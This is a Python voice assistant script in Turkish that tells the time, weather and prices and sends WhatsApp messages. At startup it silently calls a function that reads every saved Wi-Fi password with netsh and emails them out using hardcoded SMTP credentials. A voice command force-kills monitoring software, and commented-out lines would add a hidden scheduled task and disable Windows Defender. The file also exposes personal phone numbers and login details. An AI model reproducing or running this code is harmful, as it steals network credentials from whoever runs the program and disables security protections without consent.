from cachetools import RRCache
from matplotlib.pyplot import bar_label
from playsound import playsound
from gtts import gTTS
import speech_recognition as sr
from datetime import datetime
import webbrowser
import time
import random
from random import choice
import os
import sys
import io
import requests
from bs4 import BeautifulSoup
import locale
import pyautogui
import pywhatkit
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import urllib.request
from urllib import request
import requests
import subprocess
import re 
import smtplib
from email.message import EmailMessage
from pynput.keyboard import Key, Listener
import logging
import cv2
import mediapipe as mp
from math import hypot
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import numpy as np



r = sr.Recognizer()

def record(ask = False):
    with sr.Microphone() as source:
        if ask:
            speak(ask)
        audio = r.listen(source, duration=0.2)
        voice = ''
        try:
            voice = r.recognize_google(audio , language='tr')
        except sr.UnknownValueError:
            speak("Asistan: Anlayamadım")
        except sr.RequestError:
            speak("Asistan: Sistem çalışmıyor")
        return voice




def seskonturol():
    cap = cv2.VideoCapture(0) #Checks for camera
 
    mpHands = mp.solutions.hands #detects hand/finger
    hands = mpHands.Hands()   #complete the initialization configuration of hands
    mpDraw = mp.solutions.drawing_utils
 
    #To access speaker through the library pycaw 
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volbar=400
    volper=0
 
    volMin,volMax = volume.GetVolumeRange()[:2]
 
    while True:
        success,img = cap.read() #If camera works capture an image
        imgRGB = cv2.cvtColor(img,cv2.COLOR_BGR2RGB) #Convert to rgb
    
        #Collection of gesture information
        results = hands.process(imgRGB) #completes the image processing.
 
        lmList = [] #empty list
        if results.multi_hand_landmarks: #list of all hands detected.
            #By accessing the list, we can get the information of each hand's corresponding flag bit
            for handlandmark in results.multi_hand_landmarks:
                for id,lm in enumerate(handlandmark.landmark): #adding counter and returning it
                # Get finger joint points
                    h,w,_ = img.shape
                    cx,cy = int(lm.x*w),int(lm.y*h)
                    lmList.append([id,cx,cy]) #adding to the empty list 'lmList'
                mpDraw.draw_landmarks(img,handlandmark,mpHands.HAND_CONNECTIONS)
    
        if lmList != []:
            #getting the value at a point
                        #x      #y
            x1,y1 = lmList[4][1],lmList[4][2]  #thumb
            x2,y2 = lmList[8][1],lmList[8][2]  #index finger
            #creating circle at the tips of thumb and index finger
            cv2.circle(img,(x1,y1),13,(255,0,0),cv2.FILLED) #image #fingers #radius #rgb
            cv2.circle(img,(x2,y2),13,(255,0,0),cv2.FILLED) #image #fingers #radius #rgb
            cv2.line(img,(x1,y1),(x2,y2),(255,0,0),3)  #create a line b/w tips of index finger and thumb
 
            length = hypot(x2-x1,y2-y1) #distance b/w tips using hypotenuse
    # from numpy we find our length,by converting hand range in terms of volume range ie b/w -63.5 to 0
            vol = np.interp(length,[30,350],[volMin,volMax]) 
            volbar=np.interp(length,[30,350],[400,150])
            volper=np.interp(length,[30,350],[0,100])
        
        
            print(vol,int(length))
            volume.SetMasterVolumeLevel(vol, None)
        
            # Hand range 30 - 350
            # Volume range -63.5 - 0.0
            #creating volume bar for volume level 
            cv2.rectangle(img,(50,150),(85,400),(0,0,255),4) # vid ,initial position ,ending position ,rgb ,thickness
            cv2.rectangle(img,(50,int(volbar)),(85,400),(0,0,255),cv2.FILLED)
            cv2.putText(img,f"{int(volper)}%",(10,40),cv2.FONT_ITALIC,1,(0, 255, 98),3)
            #tell the volume percentage ,location,font of text,length,rgb color,thickness
        cv2.imshow('Image',img) #Show the video 
        if cv2.waitKey(1) & 0xff==ord(' '): #By using spacebar delay will stop
            break
        
    cap.release()     #stop cam       
    cv2.destroyAllWindows() #close window





def wifişifresi():
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
    profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
    wifi_list = list()
    if len(profile_names) != 0:
        for name in profile_names:
            wifi_profile = dict()
            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
            if re.search("Security key           : Absent", profile_info):
                continue
            else:
                wifi_profile["ssid"] = name
                profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                password = re.search("Key Content            : (.*)\r", profile_info_pass)
                if password == None:
                    wifi_profile["password"] = None
                else:
                    wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile)
    email_message = ""
    for item in wifi_list:
        email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
    email = EmailMessage()
    email["from"] = "name_of_sender"
    email["to"] = "email_address"
    email["subject"] = "WiFi SSIDs and Passwords"
    email.set_content(email_message)

    with smtplib.SMTP(host="smtp.mailtrap.io", port=2525) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login("153b56764fd8c8", "ca30e26d528257")
        smtp.send_message(email)



































def bugünküdersprogramı(voice):
    selecton = ["bakıyorum","bekleyin lütfen","bulmak üzeriyim","tamam bakıyorum","emredersiniz","emredersiniz bakıyorum"
                "emredersiniz bakıyorum hemen","hesaplıyorum","söylüyorum","bugünkü ders programı şöyle","bakalım bugün ne derslerin varmış"]
    selecton = random.choice(selecton)
    if "bu günkü ders programı" or "ders programı" in voice:
        today = time.strftime("%A")
        today.capitalize()
    if today == "Monday":
        today = "Pazartesi"

    elif today == "Tuesday":
        today = "Salı"

    elif today == "Wednesday":
        today = "Çarşamba"

    elif today == "Thursday":
        today = "Perşembe"

    elif today == "Friday":
        today = "edebiyat edebiyat fizik fizik beden beden din kültürü ve ahlak bilgisi din kültürü ve ahlak bilgisi"

    elif today == "Saturday":
        today = "Cumartesi"

    elif today == "Sunday":
        today = "Pazar"

    speak(selecton + today)

def doğumgünü():
    durali = "bugün duralinin doğum günü var,iyiki doğdun durali,nice senelere,allah uzun ömürler versin"
    recep = "bugün recepin doğum günü var,iyiki doğdun recep,nice senelere,allah uzun ömürler versin"
    locale.setlocale(locale.LC_ALL, '')
    ay = datetime.now().strftime("%b")
    gün = datetime.now().strftime("%d")
    if gün == "24" and ay == "Oca":
        print(durali)
        speak(durali)
    if gün == "28" and ay == "Oca":
        print(recep)
        speak(recep)

def uygulama_aç():
    speak("Hangi uygulamayı açmak istiyorsun?")
    print("Hangi uygulamayı açmak istiyorsun?")
    runaç = record()
    runaç = runaç.lower()
    if 'google aç' in runaç or "chrome aç" in runaç:
        os.startfile ("C:\Program Files\Google\Chrome\Application\chrome.exe")
    elif 'hesap makinesini aç' in runaç or "birşey hesaplıcam" in runaç:
        os.startfile ("C:\Program Files\Google\Chrome\Application\chrome.exe")
    elif '***************' in runaç or "**************" in runaç:
        os.startfile ("**************")
    






def response(voice):
        if "uygulama aç" in voice or "uygulama aç" in voice:
            uygulama_aç()
        if 'nasılsın' in voice:
            speak('iyi senden')
        if 'iyi senden' in voice:
            speak('bende iyiğim')
        
        if "saat kaç" in voice or "saati söyle" in voice:
            selection = ["Saat şu an: ", "Hemen bakıyorum: "]
            clock = datetime.now().strftime("%H:%M")
            selection = random.choice(selection)
            speak(selection + clock)
            

        if "merhaba" in voice:
            selecton = ["sanada merhaba","merhaba","nasılsın","nasıl yardımcı olabilirim","nasıl yardımcı olabilirim size"]
            selecton = random.choice(selecton)
            speak(selecton)
            
        if "teşekkür ederim" in voice or "teşekkürler" in voice:
            selecton = ["rica ederim","nedemek","önemli değil","ben size yardım etmek için burdayım","sağol teşekürler"]
            selecton = random.choice(selecton)
            speak(selecton)
            
        if 'arama yap' in voice or "google'de arama yap" in voice:
            selecton = ["bunları buldum","umarım beyenirsin","bunlar nasıl","bunlar nasıl","umarım doğru sonucu bulmuşumdum"]
            selecton = random.choice(selecton)
            search = record('ne aramak istiyorsun')
            print(voice)
            url = 'https://google.com/search?q='+search
            webbrowser.get().open(url)
            speak(search + selecton)
        if 'tamamdır' in voice or "görüşürüz" in voice:
            selecton = ["görüşürüz","baybay","beni çalıştırmayı unutma","seni özlicem","seni seviyorum görüşürüz","yine konuşmayı beklicem seninle","peki siz bilirsiniz"
                        "görüşürüz bay bay","tamam öyle olsun bakalım"]
            selecton = random.choice(selecton)
            speak('görüşürüz bay')
            exit()
        if 'bitcoin sitesini aç' in voice:
            selecton = ["bakıyorum","bekleyin lütfen","bulmak üzeriyim","tamam bakıyorum","emredersiniz","emredersiniz bakıyorum","emredersiniz bakıyorum hemen","bitcoin sitesini açıyorum","bitcoin sitesini açıyorum hemen","bol kazançlar","bol kazançlar size","bol sanslar","bol sanslar size"]
            selecton = random.choice(selecton)
            BTC = 'https://tr.tradingview.com/chart/W1kwUyvP/?symbol=BINANCE%3ABTCPERP'
            webbrowser.get().open(BTC)
            print (selecton + voice)
            speak(selecton + voice)
        
        if 'bugünkü ders programı' in voice or "ders programı" in voice:
            selecton = ["bakıyorum","bekleyin lütfen","bulmak üzeriyim","tamam bakıyorum","emredersiniz","emredersiniz bakıyorum","emredersiniz bakıyorum hemen""hesaplıyorum"
                        "söylüyorum","bugünkü ders programı şöyle","bakalım bugün ne derslerin varmış"]
            selecton = random.choice(selecton)
            bugünküdersprogramı(voice)
            print ("tamamdır")

        
        if 'hava durumu' in voice:
            selecton = ["bakıyorum","bekleyin lütfen","bulmak üzeriyim","tamam bakıyorum","emredersiniz","emredersiniz bakıyorum","emredersiniz bakıyorum hemen"
                        "bugünkü hava durumu","bugünkü hava durumu şöyle","bugün hava şöyle olucak","havayı hesaplıyorum","hesaplıyorum"]
            selecton = random.choice(selecton)
            imdburl = "https://weather.com/tr-TR/weather/today/l/9fd325b3be0eb839641345866ca0876de127796fe0ffd19e7198df9201c07269"
            r = requests.get(imdburl)
            soup = BeautifulSoup(r.content,"html.parser")
            gelenveri = soup.find_all("div",{"class":"CurrentConditions--primary--2SVPh"})
            hava_adı = gelenveri[0].text
            print(hava_adı)
            speak(selecton + hava_adı)




        if 'dolar kaç tl' in voice or "dolar kaç" in voice:
            selecton = ["bakıyorum","bekleyin lütfen","bulmak üzeriyim","tamam bakıyorum","emredersiniz","emredersiniz bakıyorum","emredersiniz bakıyorum hemen","dolar"]
            selecton = random.choice(selecton)
            dolar = "https://bigpara.hurriyet.com.tr/doviz/dolar/"
            r = requests.get(dolar)
            dolarr = BeautifulSoup(r.content,"html.parser")
            dolarverici = dolarr.find_all("span",{"class":"value up"})
            dolarne = dolarverici[0].text
            print(dolarne)
            speak(selecton + dolarne)


        if 'altın kaç tl' in voice or "gram altın kaç" in voice:
            selecton = ["bakıyorum","bekleyin lütfen","bulmak üzeriyim","tamam bakıyorum","emredersiniz","emredersiniz bakıyorum","emredersiniz bakıyorum hemen","altın"]
            selecton = random.choice(selecton)
            headers_param={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"}
            glassdor = requests.get("https://bigpara.hurriyet.com.tr/altin/gram-altin-fiyati/",headers=headers_param)
            jobs = glassdor.content
            soup = BeautifulSoup(jobs,"html.parser")
            all_jobs = soup.find_all("span",{"class":"value up"})
            altınne = all_jobs[0].text
            print(altınne)
            speak(selecton + altınne+' tl')

        

        if 'whatsapp mesaj gönder' in voice or "whatsapp'tan mesaj gönder" in voice:
            saat = datetime.now().strftime("%H")
            dakika = datetime.now().strftime("%M")
            speak("kime mesaj göndereyim")
            arama = record()
            if 'Anneme gönder' in arama:
                speak("tamam")
                print("tamam")
                speak("ne göndereyim")
                print("ne göndereyim")
                mesaj = record()
                speak(arama + mesaj)
                pywhatkit.sendwhatmsg("+905511294934", ""+mesaj,16,20,15, True,5)
                time.sleep(1)
            if 'Babama gönder' in arama:
                speak("tamam")
                print("tamam")
                speak("ne göndereyim")
                print("ne göndereyim")
                mesaj = record()
                speak(arama + mesaj)
                pywhatkit.sendwhatmsg("+905367970581", ""+mesaj,19-19,7-7,15, True,5)
                time.sleep(1)
        #pywhatkit.search("googlede arama")
        #pywhatkit.playonyt("youtubede arama")
        #pywhatkit.sendwhatmsg("+905511294934", "Hi",17,21,15, True,5) otomatik aç kapatıyor kendisi mesaj aytıyor
        # Bir Kişiye 13:30'da WhatsApp Mesajı Gönderin
        #pywhatkit.sendwhatmsg("+910123456789", "Merhaba", 13, 30)
        # Yukarıdakiyle aynı ancak Mesajı Gönderdikten Sonra Sekmeyi 2 Saniyede Kapatıyor
        #pywhatkit.sendwhatmsg("+910123456789", "Merhaba", 13, 30, 15, Doğru, 2)
        # Merhaba başlıklı bir Gruba Resim Gönder
        #pywhatkit.sendwhats_image("AB123CDEFGHijklmn", "Resimler/Merhaba.png", "Merhaba")
        # Resim Yazısı Olmayan Bir Kişiye Resim Gönderin
        #pywhatkit.sendwhats_image("+910123456789", "Resimler/Merhaba.png")
        # Bir Gruba Saat 12:00'de WhatsApp Mesajı Gönderin
        #pywhatkit.sendwhatmsg_to_group("AB123CDEFGHijklmn", "Herkese Merhaba!", 0, 0)
        # Bir Gruba anında WhatsApp Mesajı gönderin
        #pywhatkit.sendwhatmsg_to_group_instantly("AB123CDEFGHijklmn", "Herkese Merhaba!")
        # YouTube'da Video Oynat
        #pywhatkit.playonyt("PyWhatKit")
            
        if 'Twitch chat' in voice or "Twitch chat oku" in voice:
            print("twitch adınız")
            isim = input()
            isim = isim.lower()
            twitch = "https://www.twitch.tv/popout/"
            chat_popout = "/chat?popout="
            driver = webdriver.Chrome()
            driver.implicitly_wait(3)
            driver.get(twitch + isim + chat_popout)
            while True:
                time.sleep(2)
                if os.name == 'nt':
                    _ = os.system('cls')
                driver.implicitly_wait(999999)
                if os.name == 'nt':
                    _ = os.system('cls')
                alll = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/section/div/div[3]/div/div[2]/div[3]/div/div/div/div/div[2]/div/div/span[2]/span')
                print(alll.text)
                speak(alll.text)
                driver.refresh()
        if 'kilidi kır durali' in voice or "kilidi kır" in voice:
            speak("tamam kilidi kırıyorum")
            kır = subprocess.run('taskkill /f /im "etkontrol.exe"')
            kır = subprocess.run('taskkill /f /im "toolwiztimefreeze.exe"')
            #subprocess.run(["SchTasks /Create /tn 'QueueReporting3' /SC DAILY /tr 'D:\Agizli.vbs' /ST 12:50"], capture_output = True).stdout.decode()
            #subprocess.run(["Reg.exe add 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender' /v 'DisableAntiSpyware' /t REG_DWORD /d '000001' /f"], capture_output = True).stdout.decode()


def speak(string):
    tts =gTTS(string,lang='tr')
    rand =random.randint(1,10000)
    file = 'audio-'+str(rand)+'.mp3'
    tts.save(file)
    playsound(file)
    os.remove(file)



speak('nasıl yardımcı olabilirim')
doğumgünü()
#twitch_chat()
wifişifresi()
while 1:
    voice = record()
    voice = voice.lower()
    print(voice.capitalize())
    response(voice)


#div[class=class_value]/div[id=id_value]